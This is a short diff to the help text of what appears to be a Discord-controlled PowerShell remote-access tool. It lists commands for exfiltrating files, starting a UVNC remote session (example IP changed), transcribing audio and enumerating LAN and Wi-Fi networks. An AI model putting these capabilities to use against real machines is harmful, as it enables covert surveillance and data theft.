@@ -297,7 +297,7 @@ $script:jsonPayload = @{
 - **Exfiltrate**: Send various files. (see ExtraInfo)
 - **Upload**: Upload a file. (see ExtraInfo)
 - **Download**: Download a file. (attach a file with the command)
-- **StartUvnc**: Start UVNC client `StartUvnc -ip 192.168.1.1 -port 8080`
+- **StartUvnc**: Start UVNC client `StartUvnc -ip 192.168.0.139 -port 8080`
 - **SpeechToText**: Send audio transcript to Discord
 - **EnumerateLAN**: Show devices on LAN (see ExtraInfo)
 - **NearbyWifi**: Show nearby wifi networks (!user popup!)
